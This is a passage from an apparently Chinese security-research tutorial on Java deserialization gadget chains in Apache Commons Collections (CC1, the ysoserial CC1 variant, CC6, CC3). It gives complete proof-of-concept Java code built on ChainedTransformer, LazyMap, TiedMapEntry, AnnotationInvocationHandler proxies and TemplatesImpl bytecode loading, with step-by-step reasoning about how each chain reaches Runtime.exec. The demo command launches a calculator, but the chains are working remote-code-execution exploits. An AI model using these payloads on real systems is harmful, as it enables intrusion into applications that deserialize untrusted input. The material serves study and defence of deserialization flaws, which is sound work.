反序列化成功：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191831-594aec66-14dc-1.png"/></p>
<h5 data-content="1" id="4b37949225f9a8862de664cf10ce5ac7">简单小总结</h5>
<p>1.首先反序列化他会调用AnnotationInvocationHandler类的readobject方法，他会调用到setValue方法，此时的memberValue是我们通过反射进行构造函数赋值为了TransformedMap</p>
<p>2.调用MapEntry的setValue方法，此时的parent是transformMap，接着调用到transformMap的checkSetValue方法</p>
<p>3.接着调用transform方法，此时的valueTransformer是我们通过调用transformMap类的静态方法decorate进行了赋值。赋值为了chainedTransformer</p>
<p>4.接着循环在chainedTransformer类中循环调用transformer方法</p>
<p>4.最后到命令执行。</p>
<h4 data-content="1" id="2c777b8ac06d7e46f926522fdc9f5987">CC1(Ysoserial中的CC1)</h4>
<h5 data-content="1" id="14831de5c32501e6e82101cc96f6ed54">最终的POC</h5>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
        <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">lazyMap</span><span class="o">);</span>

        <span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>

        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">mapProxy</span><span class="o">);</span>
</pre></div>
<h5 data-content="1" id="cd557c9bf9ed2b2b3e5d16d421f4370f">流程分析</h5>
<p>我们发现在Ysoserial中跟我们上面分析的CC1是差不多的。</p>
<p>后面其实都是一样的。</p>
<p>这里我们将之前在Map.Entry中的setValue方法改为了调用LazyMap的get方法</p>
<p>这里也是调用了transform方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191844-60fb5af4-14dc-1.png"/><br/>
他的factory是可控的，是可以通过LazyMap的decorate静态方法传递进去。并且他传进去一个Map，我们看上面的if判断，判断我们这个map里面是否有这个key，如果有的话那么直接返回，所以我们需要确保他是没有这个key的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191855-676a3f54-14dc-1.png"/><br/>
接下来我们需要找到哪里调用了lazymap的get方法。</p>
<p>来到我们刚才分析的AnnotationInvocationHandler类中的invoke方法。</p>
<p>这里调用了memberValues的get方法，memberValues是我们可控的，我们可以反射实例化他的构造函数进行赋值。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191907-6e9918f4-14dc-1.png"/><br/>
这里的AnnotationInvocationHandler是一个调用处理器类，他的invoke方法什么时候会调用呢？</p>
<p>只要外面有方法调用他就会调用他的invoke方法。</p>
<p>这里我们需要创建一个调用处理器，当执行我们代理的接口的方法的时候，他就会执行调用处理器的invoke方法</p>
<div class="highlight"><pre><span></span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
<span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
<span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">InvocationHandler</span> <span class="n">h</span> <span class="o">=</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">lazyMap</span><span class="o">);</span>
</pre></div>
<p>接着创建一个动态代理类使用jdk内置的Proxy类，这里简单理解一下这三个参数。</p>
<p>第一个参数:类加载器，在内存中生成字节码也是class文件，要执行也得先加载到内存中，所以需要类加载器，并且jdk要求，目标类的加载器，必须和代理类的加载器使用的是同一个。</p>
<p>第二个参数：在内存中生成代理类的时候，这个代理类是需要你告诉它实现那些接口的。</p>
<p>第三个参数: 调用处理器，当我们执行代理类的方法时，就会执行调用处理器的invoke方法。</p>
<div class="highlight"><pre><span></span><span class="n">Map</span> <span class="n">mapProxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">h</span><span class="o">);</span>
</pre></div>
<p>例如:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191921-771c27dc-14dc-1.png"/><br/>
之后我们通过反序列化进行调用的时候，他会执行invoke方法，从而导致反序列化漏洞触发。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191931-7cc6e3a2-14dc-1.png"/><br/>
可以看到他这里会调用entrySet方法 他并需要走到下面的if，所以我们的注解不需要指定为上面的，比如Target.class等等。</p>
<h4 data-content="1" id="6685868ec15449b8f58f30e7b352f66e">CC6链</h4>
<h5 data-content="1" id="550a5d30019eca62f11414fd10cf5257">最终的POC</h5>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
        <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
        <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
<span class="o">};</span>
<span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
        <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">));</span>
        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbbb"</span><span class="o">);</span>
        <span class="n">lazyMap</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">"aaa"</span><span class="o">);</span>
<span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span>  <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
        <span class="n">Field</span> <span class="n">fieldfactory</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
        <span class="n">fieldfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">fieldfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="c1">//这里我们发现在我们序列化的时候 他就直接直接执行了 这是因为最后我们进入到LazyMap中的时候 他就直接调用了transformer方法</span>
        <span class="n">serialize</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<h5 data-content="1" id="fe581a751d82f44e42e62c1766bdb0f6">流程分析</h5>
<p>后面还是的命令执行还是跟CC1是一样的。</p>
<p>前面通过HashMap的readobject调用到hashcode方法，那个类的hashcode方法调用到了lazymap的get方法。</p>
<p>首先我们需要找到那个类的hashcode方法中调用了get方法。</p>
<p>这里找到了TiedMapEntry的hashcode方法中调用了getValue方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627191946-85b92650-14dc-1.png"/><br/>
在getValue方法中又调用了get方法。</p>
<p>这里的map我们是可控的，可以通过TiedMapEntry的构造函数进行赋值。我们可以将map赋值为lazyMap，他就会调用到lazyMap的get方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192000-8e427998-14dc-1.png"/><br/>
那么我们构造出来的payload是不是这样的?</p>
<div class="highlight"><pre><span></span><span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"getMethod"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"getRuntime"</span><span class="o">,</span><span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"invoke"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">}),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span>
                        <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
                        <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">"open -a Calculator"</span><span class="o">})</span>
        <span class="o">};</span>
        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;();</span>
        <span class="n">Map</span> <span class="n">lazyMap</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">map</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
        <span class="n">TiedMapEntry</span> <span class="n">tiedMapEntry</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TiedMapEntry</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>

        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">tiedMapEntry</span><span class="o">,</span><span class="s">"bbb"</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">map2</span><span class="o">);</span>
<span class="c1">//        unserialize("ser.bin");</span>
</pre></div>
<p>我们发现在序列化的时候他就直接执行了。这是为什么呢？</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192011-94dfb5a4-14dc-1.png"/><br/>
因为我们在map2.put的时候他调用了hash方法。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192020-99d82b90-14dc-1.png"/><br/>
我们得在put的时候让他不能触发这条链,我们可以将transformer改成空的，也可以在调用lazymap.decorate方法的时候给他传进去一个ConstantTransformer类</p>
<p>最后当我们put完之后再给他改回来。</p>
<p>例如:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192029-9f53037e-14dc-1.png"/></p>
<div class="highlight"><pre><span></span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span> <span class="o">=</span>  <span class="n">LazyMap</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
<span class="n">Field</span> <span class="n">fieldfactory</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"factory"</span><span class="o">);</span>
<span class="n">fieldfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">fieldfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">lazyMap</span><span class="o">,</span><span class="n">chainedTransformer</span><span class="o">);</span>
</pre></div>
<p>此时我们在序列化的时候他就不会执行了。</p>
<p>但是我们在反序列化的时候他也没有执行.....</p>
<p>因为我们在put的时候会给他添加一个key。</p>
<p>所以我们需要在他put完之后给他删了。</p>
<p>此时就可以反序列化成功了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192051-ac84ae8a-14dc-1.png"/></p>
<h4 data-content="1" id="2f549f806c2da89cdb4054bddd7495de">CC链3</h4>
<h5 data-content="1" id="ca6c1b9f50af1e9be0afdfdae588e653">最终的poc</h5>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
        <span class="n">Class</span> <span class="n">tc</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
        <span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaaaaa"</span><span class="o">);</span>
        <span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/Users/relay/Documents/spring5MVC/Collections1/target/classes/Test.class"</span><span class="o">));</span>
        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">codes</span> <span class="o">=</span> <span class="o">{</span><span class="n">code</span><span class="o">};</span>
        <span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>

        <span class="n">Field</span> <span class="n">tfactory</span> <span class="o">=</span> <span class="n">tc</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_tfactory"</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">tfactory</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="k">new</span> <span class="n">TransformerFactoryImpl</span><span class="o">());</span>
<span class="c1">//        templates.newTransformer();</span>


        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span><span class="o">=</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">templates</span><span class="o">),</span>
                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">"newTransformer"</span><span class="o">,</span>
                        <span class="kc">null</span><span class="o">,</span>
                       <span class="kc">null</span><span class="o">)</span>
        <span class="o">};</span>

        <span class="n">ChainedTransformer</span> <span class="n">chainedTransformer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="n">transformers</span><span class="o">);</span>
<span class="c1">//        chainedTransformer.transform(templates);</span>

        <span class="n">HashMap</span> <span class="n">hashMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
        <span class="n">hashMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"value"</span><span class="o">,</span><span class="s">"aaav"</span><span class="o">);</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">decorate</span> <span class="o">=</span> <span class="n">TransformedMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">hashMap</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="n">chainedTransformer</span><span class="o">);</span>

        <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">forName</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">);</span>
        <span class="n">Constructor</span><span class="o">&lt;?&gt;</span> <span class="n">annotation</span> <span class="o">=</span> <span class="n">forName</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">annotation</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">annotation</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Retention</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">decorate</span><span class="o">);</span>

        <span class="n">serialize</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
        <span class="n">unserialize</span><span class="o">(</span><span class="s">"ser.bin"</span><span class="o">);</span>
</pre></div>
<h5 data-content="1" id="f08fb8b20cbdbe7a40dd18388597d8b6">流程分析</h5>
<p>CC3这条链使用了类加载机制，我们都知道在类加载的时候，他是不会执行代码的，只有在初始化的时候他才会执行。</p>
<p>那我们是不是就需要一个初始化的地方呢？</p>
<p>那我们就需要去找那个类重写了defineClass方法，需要是public的。</p>
<p>最终在TemplatesImpl类中找到了一个权限为default的defineclass，也就是说只能他这个包里面才能调用。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192103-b38025ac-14dc-1.png"/><br/>
我们去看这个包调用了这个defineClass</p>
<p>可以看到在他自己包下的defineTransletClasses方法调用了defineclass方法，但是他的方法是私有的，所以我们需要去找哪里调用了defineTransletClasses。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192112-b9086b56-14dc-1.png"/><br/>
在同样包下的有3处调用了defineTransletClasses方法，但是有两个是私有属性的，只有一个是public的。虽然是public的，但是他对于_class是没有后续操作的，因为我们需要初始化才可以执行代码。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192121-be3d58fc-14dc-1.png"/></p>
<p>所以我们来到getTransletInstance方法，这是一个私有方法，但是下面对_Class进行了初始化。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192131-c486f07e-14dc-1.png"/></p>
<p>那我们就需要找哪里调用了getTransletInstance方法。</p>
<p>这里我们找到了他的newTransformer方法，他的权限修饰符是public的，我们是直接可以调用的。并且调用了getTransletInstance方法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192141-ca823e3e-14dc-1.png"/><br/>
找到这里基本上这条这条链就结束了。</p>
<div class="highlight"><pre><span></span><span class="n">defineClass</span><span class="o">()</span> <span class="o">--&gt;</span> <span class="n">defineTransletClasses</span><span class="o">()</span> <span class="o">--&gt;</span> <span class="n">getTransletInstance</span><span class="o">()</span> <span class="o">--&gt;</span> <span class="n">newTransformer</span><span class="o">()</span>
</pre></div>
<p>接下来我们去看一下整个代码的逻辑</p>
<p>首先从newTransformer入口开始。</p>
<p>这里有这几个值_outputProperties _indentNumber _tfactory 这三个值在目前看来是不需要赋值的，就算不赋值也是可以调用到getTransletInstance方法的。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192152-d12b70ac-14dc-1.png"/><br/>
我们来到getTransletInstance方法。</p>
<p>在这里他有两个判断_name 如果为null的话，他就直接return null了，所以我们不能让他为null，_class如果为null的话，他就会走到defineTransletClasses方法，所以_class我们不需要给他赋值。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192202-d697c252-14dc-1.png"/><br/>
来到defineTransletClasses方法。</p>
<p>这里判断如果_bytecodes为null的话，他就直接抛出异常。所以__bytecode需要赋值。我们注意到_tfactory，他是要调用方法的，所以他也需要赋值。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192214-ddde51fc-14dc-1.png"/><br/>
那我们的payload是不是可以暂时写成这样? 通过反射修改这几个属性。</p>
<p>这里的codes需要赋什么值？</p>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TemplatesImpl</span><span class="o">();</span>
<span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">TemplatesImpl</span><span class="o">&gt;</span> <span class="n">templatesClass</span> <span class="o">=</span> <span class="n">templates</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
<span class="n">Field</span> <span class="n">name</span> <span class="o">=</span> <span class="n">templatesClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_name"</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">name</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
<span class="n">Field</span> <span class="n">bytecodes</span> <span class="o">=</span> <span class="n">templatesClass</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">"_bytecodes"</span><span class="o">);</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="n">bytecodes</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="n">codes</span><span class="o">);</span>
</pre></div>
<p>我们来到defineClass方法</p>
<p>这里他的参数是一个一维的byte数组。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230627192226-e4e81636-14dc-1.png"/><br/>
defineClass是在defineTransletClasses方法的for循环中调用的。</p>
